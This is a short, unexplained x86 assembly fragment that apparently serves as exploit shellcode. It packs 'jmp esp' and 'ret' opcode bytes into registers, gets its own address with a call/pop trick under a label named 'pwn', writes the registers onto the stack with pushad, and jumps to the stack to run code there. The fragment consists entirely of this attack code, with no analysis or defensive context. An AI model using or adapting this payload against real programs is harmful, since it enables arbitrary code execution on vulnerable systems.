mov eax, 0xc3c3c3c3
mov ebx, 1024
mov edx, 0xa0
mov ebp, 0xe4ff6060
mov esi, 0x606060e3
mov edi, 0x420fd439
call pwn
pwn:
pop esp
sub esp,4
pushad
mov esp, 0x340
pushad
jmp esp

